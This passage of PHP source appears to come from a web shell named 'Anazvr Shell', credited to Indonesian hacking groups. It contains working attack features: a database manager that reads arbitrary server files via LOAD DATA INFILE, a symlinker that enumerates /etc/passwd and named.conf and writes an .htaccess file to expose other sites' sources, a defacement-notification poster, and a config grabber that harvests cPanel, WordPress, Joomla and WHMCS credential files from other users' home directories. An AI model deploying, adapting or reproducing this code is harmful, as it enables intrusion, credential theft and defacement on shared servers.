echo "<br><br><form method=\"GET\"><input type=\"hidden\" name=\"x\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b> <input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\"> <b>To:</b> <input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\"> <input type=\"submit\" value=\"View\"></form>";
echo "<br><form method=\"POST\">\n";
echo "<table class='tub'><tr>";
echo "<th><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></th>";
for ($i=0;$i<mysql_num_fields($result);$i++) {
  $v = mysql_field_name($result,$i);
  if ($e[0] == "a") {$s = "d"; $m = "asc";}
  else {$s = "a"; $m = "desc";}
  echo "<th>";
  if (empty($e[0])) {$e[0] = "a";}
  if (@$e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}
  else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."x=img&img=sort_".$m."\" alt=\"".$m."\"></a>";}
  echo "</th>";
}
echo "<th><font color=\"#00FF00\"><b>action</b></font></th>";
echo "</tr>";
while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
  echo "<tr>";
  $w = "";
  $i = 0;
  foreach ($row as $k=>$v) {
$name = mysql_field_name($result,$i);
$w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;
  }
  if (count($row) > 0) { $w = substr($w,0,strlen($w)-3); }
  echo "<td align='center' style='padding:0px;'><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";
  $i = 0;
  foreach ($row as $k=>$v) {
$v = htmlspecialchars($v);
if ($v == "") { $v = "<font color=\"#00FF00\">NULL</font>"; }
echo "<td>".$v."</td>";
$i++;
  }
  echo "<td>";
  echo "<a href=\"".$sql_surl."sql_x=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\">Delete</a>";
  echo "&nbsp;|&nbsp;";
  echo "<a href=\"".$sql_surl."sql_tbl_x=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\">Edit</a> ";
  echo "</td>";
  echo "</tr>";
}
mysql_free_result($result);
echo "</table><hr size=\"1\" noshade><p align=\"left\"><input type=\"checkbox\"/> <select name=\"sql_x\">";
echo "<option value=\"\">With selected:</option>";
echo "<option value=\"deleterow\">Delete</option>";
echo "</select> <input class=\"inputzbut\" type=\"submit\" value=\"Confirm\"></form></p>";
}
 }
 else {
$result = mysql_query("SHOW TABLE STATUS", $sql_sock);
if (!$result) { echo mysql_smarterror(); }
else {
echo '<form method="POST">
<table class="tub">
<tr><th><input type="checkbox" name="boxtbl_all" value="1"></th><th>Table</th><th>Rows</th><th>Engine</th><th>Created</th><th>Modified</th><th>Size</th><th>Action</th></tr>';
 $i = 0;
 $tsize = $trows = 0;
 while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
$tsize += $row["Data_length"];
$trows += $row["Rows"];
$size = view_size($row["Data_length"]);
echo'<tr>
<td align="center" style="padding:0px;"><input type="checkbox" name="boxtbl[]" value="'.$row["Name"].'"></td>
<td><a href="'.$sql_surl.'sql_tbl='.urlencode($row["Name"]).'"><b>'.$row["Name"].'</b></a></td>
<td>'.$row["Rows"].'</td><td>'.$row["Engine"].'</td><td>'.$row["Create_time"].'</td><td>'.$row["Update_time"].'</td><td>'.$size.'</td>
<td><a href="'.$sql_surl.'sql_x=query&sql_query='.urlencode("DELETE FROM `".$row["Name"]."`").'">Empty</a>&nbsp;|&nbsp;<a href="'.$sql_surl.'sql_x=query&sql_query='.urlencode("DROP TABLE `".$row["Name"]."`").'">Drop</a>&nbsp;|&nbsp;<a href="'.$sql_surl.'sql_tbl_x=insert&sql_tbl='.$row["Name"].'">Insert</a></td>
</tr>';
$i++;
 }
 echo "\t\t<tr>\n".
"\t\t<th>+</th><th>$i table(s)</th><th>$trows</th><th>$row[1]</th><th>$row[10]</th><th>$row[11]</th><th>".view_size($tsize)."</th><th></th>\n";
echo'</tr>
</table>
<div align="right">
<select class="inputz" name="sql_x">
<option value="">With selected:</option>
<option value="tbldrop">Drop</option>
<option value="tblempty">Empty</option>";
<option value="tbldump">Dump</option>";
<option value="tblcheck">Check table</option>";
<option value="tbloptimize">Optimize table</option>";
<option value="tblrepair">Repair table</option>";
<option value="tblanalyze">Analyze table</option>";
</select>
<input class="inputzbut" type="submit" value="Confirm">
</div>
</form>';
 mysql_free_result($result);
}
 }
}
 }
}
else {
$xs = array("","newdb","serverstatus","servervars","processes","getfile");
if (in_array($sql_x,$xs)) {
echo '<table class="tab">
<tr>
<td style="border:1px solid #333333;padding:3px;"><b>Create new DB:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="newdb">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input class="inputz" type="text" name="sql_newdb" size="20">
<input class="inputzbut"  type="submit" value="Create">
</form>
</td>
<td style="border:1px solid #333333;padding:3px;"><b>View File:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="getfile">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input class="inputz" type="text" name="sql_getfile" size="30" value="'.htmlspecialchars($sql_getfile).'">
<input class="inputzbut" type="submit" value="Get">
</form>
</td>
</tr>
</table>';
}
if (!empty($sql_x)) {
 echo "<hr size=\"1\" noshade>";
 if ($sql_x == "newdb") {
echo "<b>";
if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
 }
 if ($sql_x == "serverstatus") {
$result = mysql_query("SHOW STATUS", $sql_sock);
echo "<center><b>Server status variables:</b><br><br>";
echo "<table class='tub'><th><b>Name</b></th><th><b>Value</b></th></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
echo "</table></center>";
mysql_free_result($result);
 }
 if ($sql_x == "servervars") {
$result = mysql_query("SHOW VARIABLES", $sql_sock);
echo "<center><b>Server variables:</b><br><br>";
echo "<table class='tub'><th><b>Name</b></th><th><b>Value</b></th></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
echo "</table>";
mysql_free_result($result);
 }
 if ($sql_x == "processes") {
if (!empty($kill)) {
 $query = "KILL ".$kill.";";
 $result = mysql_query($query, $sql_sock);
 echo "<b>Process #".$kill." was killed.</b>";
}
$result = mysql_query("SHOW PROCESSLIST", $sql_sock);
echo "<center><b>Processes:</b><br><br>";
echo "<table class='tub'><th><b>ID</b></th><th><b>USER</b></th><th><b>HOST</b></th><th><b>DB</b></th><th><b>COMMAND</b></th><th><b>TIME</b></th><th><b>STATE</b></th><th><b>INFO</b></th><th><b>Action</b></th></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_x=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
echo "</table>";
mysql_free_result($result);
 }
 if ($sql_x == "getfile") {
$tmpdb = $sql_login."_tmpdb";
$select = mysql_select_db($tmpdb);
if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
if ($select) {
 $created = FALSE;
 mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
 mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
 $result = mysql_query("SELECT * FROM tmp_file;");
 if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
 else {
for ($i=0;$i<mysql_num_fields($result);$i++) { $name = mysql_field_name($result,$i); }
$f = "";
while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) { $f .= join ("\r\n",$row); }
if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
mysql_free_result($result);
mysql_query("DROP TABLE tmp_file;");
 }
}
mysql_drop_db($tmpdb);
 }
}
 }
}
echo '</td></tr>';
if ($sql_sock) {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected < 0)) { $affected = 0; }
  echo "\t<tr><th colspan=2>Affected rows: $affected</th></tr>";
}
echo '</table></center>';
  }
echo '</form>';
}
}
elseif($_GET['do'] == 'about') {
	
    echo '<font color=white><center>Anazvr Shell<hr>Just Shell By Anazvr -> <br>Gabungan Dari Shell [ IndoXploit ]-[ Andela ]-[ Security Exploaded ]-[ HIDDENSHELL (GSH) ]<br>	
Big Thanks To :
	 <marquee direction=left scrollamount=4>| 
<font color=cyan>Garuda Security Hacker</font> | PhantomGhost | IndoXploit | Java Cyber Army | My Self :D Anazvr Security | Security Cyber Art | Lead Cyber Team | JancokSec | Owl Squad | Clowns Hacktivism Team | Hacker Patah Hati | Dan semua grup hacking yang pernah saya kunjungi ^_^
</marquee>
	<br>
	<br>
Garuda Security Hacker :
	 <marquee direction=left scrollamount=4>
| Yukinoshita47 | Tuan2Fay | Snooze | E7B_404 | Cr4bbyP4tty | Fazlast | DarkTerrorizt | Prof.Engkus.ST.MT | Mr Secretz | Mr.UdinDotID | Mr_Viruzer#29 | Mr.Spongebob | Sys47ID | healer | ./CalmCoder | <font color=cyan>Anazvr</font> | ShadowHeart | dr.Sobri3195 | All Member Garuda Security Hacker |</marquee>
<br><br>For More Script Visit <a href="http://anazvr.blogspot.co.id/">Here</a></font>';
	
}
elseif($_GET['do'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("cox_sym",0777);
@chdir("cox_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/cox_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("cox_sym",0777);
@chdir("cox_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/cox_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("cox_sym",0777);@chdir("cox_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex Anazvr.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/cox_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }    
}
elseif($_GET['do'] == 'defacerid') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value'Anazvr'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Garuda Security Hacker'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}

elseif($_GET['do'] == 'config') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("cox_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("cox_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_cox) {
			$user_config_dir = "/home/$user_cox/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
										"/home/$user_cox/.my.cnf" => "cpanel",
					"/home/$user_cox/.accesshash" => "WHM-accesshash",
					"/home/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home/$user_cox/public_html/application/config/database.php" => "Ellislab",					
					"/home/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home/$user_cox/public_html/central/configuration.php" => "WHM Central",
					"/home/$user_cox/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/submitticket.php" => "WHMCS",										
					"/home/$user_cox/public_html/configuration.php" => "Joomla",					
					"/home/$user_cox/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_cox/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_cox/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home/$user_cox/public_html/Home/configuration.php" => "JoomlaHome",
					"/home/$user_cox/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home/$user_cox/public_html/home/configuration.php" => "JoomlaHome",
					"/home/$user_cox/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home/$user_cox/public_html/New/configuration.php" => "JoomlaNew",
					"/home/$user_cox/public_html/new/configuration.php" => "JoomlaNew",
					"/home/$user_cox/public_html/News/configuration.php" => "JoomlaNews",
					"/home/$user_cox/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home/$user_cox/public_html/news/configuration.php" => "JoomlaNews",
					"/home/$user_cox/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home/$user_cox/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home/$user_cox/public_html/cms/configuration.php" => "JoomlaCms",
					"/home/$user_cox/public_html/Main/configuration.php" => "JoomlaMain",
					"/home/$user_cox/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home/$user_cox/public_html/main/configuration.php" => "JoomlaMain",
					"/home/$user_cox/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home/$user_cox/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home/$user_cox/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home/$user_cox/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_cox/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home/$user_cox/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_cox/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home/$user_cox/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home/$user_cox/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home/$user_cox/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home/$user_cox/public_html/Press/configuration.php" => "JoomlaPress",
					"/home/$user_cox/public_html/press/configuration.php" => "JoomlaPress",
					"/home/$user_cox/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home/$user_cox/public_html/wp/configuration.php" => "JoomlaWp",
					"/home/$user_cox/public_html/WP/configuration.php" => "JoomlaWP",
					"/home/$user_cox/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home/$user_cox/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home/$user_cox/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_cox/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_cox/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home/$user_cox/public_html/Home/wp-config.php" => "WordPressHome",
					"/home/$user_cox/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home/$user_cox/public_html/home/wp-config.php" => "WordPressHome",
					"/home/$user_cox/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home/$user_cox/public_html/New/wp-config.php" => "WordPressNew",
					"/home/$user_cox/public_html/new/wp-config.php" => "WordPressNew",
					"/home/$user_cox/public_html/News/wp-config.php" => "WordPressNews",
					"/home/$user_cox/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home/$user_cox/public_html/news/wp-config.php" => "WordPressNews",
					"/home/$user_cox/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home/$user_cox/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home/$user_cox/public_html/cms/wp-config.php" => "WordPressCms",
					"/home/$user_cox/public_html/Main/wp-config.php" => "WordPressMain",
					"/home/$user_cox/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home/$user_cox/public_html/main/wp-config.php" => "WordPressMain",
					"/home/$user_cox/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home/$user_cox/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home/$user_cox/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home/$user_cox/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_cox/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home/$user_cox/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_cox/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home/$user_cox/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home/$user_cox/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home/$user_cox/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home/$user_cox/public_html/Press/wp-config.php" => "WordPressPress",
					"/home/$user_cox/public_html/press/wp-config.php" => "WordPressPress",
					"/home/$user_cox/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home/$user_cox/public_html/wp/wp-config.php" => "WordPressWp",
					"/home/$user_cox/public_html/WP/wp-config.php" => "WordPressWP",
					"/home/$user_cox/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home/$user_cox/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home/$user_cox/public_html/Portal/wp-config.php" => "WordPressPortal",
										"/home1/$user_cox/.my.cnf" => "cpanel",
					"/home1/$user_cox/.accesshash" => "WHM-accesshash",
					"/home1/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home1/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home1/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home1/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_cox/public_html/application/config/database.php" => "Ellislab",					
					"/home1/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home1/$user_cox/public_html/central/configuration.php" => "WHM Central",
					"/home1/$user_cox/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/submitticket.php" => "WHMCS",										
					"/home1/$user_cox/public_html/configuration.php" => "Joomla",					
					"/home1/$user_cox/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_cox/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_cox/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home1/$user_cox/public_html/Home/configuration.php" => "JoomlaHome",
					"/home1/$user_cox/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home1/$user_cox/public_html/home/configuration.php" => "JoomlaHome",
					"/home1/$user_cox/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home1/$user_cox/public_html/New/configuration.php" => "JoomlaNew",
					"/home1/$user_cox/public_html/new/configuration.php" => "JoomlaNew",
					"/home1/$user_cox/public_html/News/configuration.php" => "JoomlaNews",
					"/home1/$user_cox/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home1/$user_cox/public_html/news/configuration.php" => "JoomlaNews",
					"/home1/$user_cox/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home1/$user_cox/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home1/$user_cox/public_html/cms/configuration.php" => "JoomlaCms",
					"/home1/$user_cox/public_html/Main/configuration.php" => "JoomlaMain",
					"/home1/$user_cox/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home1/$user_cox/public_html/main/configuration.php" => "JoomlaMain",
					"/home1/$user_cox/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home1/$user_cox/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home1/$user_cox/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home1/$user_cox/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home1/$user_cox/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home1/$user_cox/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home1/$user_cox/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home1/$user_cox/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home1/$user_cox/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home1/$user_cox/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home1/$user_cox/public_html/Press/configuration.php" => "JoomlaPress",
					"/home1/$user_cox/public_html/press/configuration.php" => "JoomlaPress",
					"/home1/$user_cox/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home1/$user_cox/public_html/wp/configuration.php" => "JoomlaWp",
					"/home1/$user_cox/public_html/WP/configuration.php" => "JoomlaWP",
					"/home1/$user_cox/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home1/$user_cox/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home1/$user_cox/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home1/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_cox/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_cox/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home1/$user_cox/public_html/Home/wp-config.php" => "WordPressHome",
					"/home1/$user_cox/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home1/$user_cox/public_html/home/wp-config.php" => "WordPressHome",
					"/home1/$user_cox/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home1/$user_cox/public_html/New/wp-config.php" => "WordPressNew",
					"/home1/$user_cox/public_html/new/wp-config.php" => "WordPressNew",
					"/home1/$user_cox/public_html/News/wp-config.php" => "WordPressNews",
					"/home1/$user_cox/public_html/NEWS/wp-config.php" => "WordPressNews",
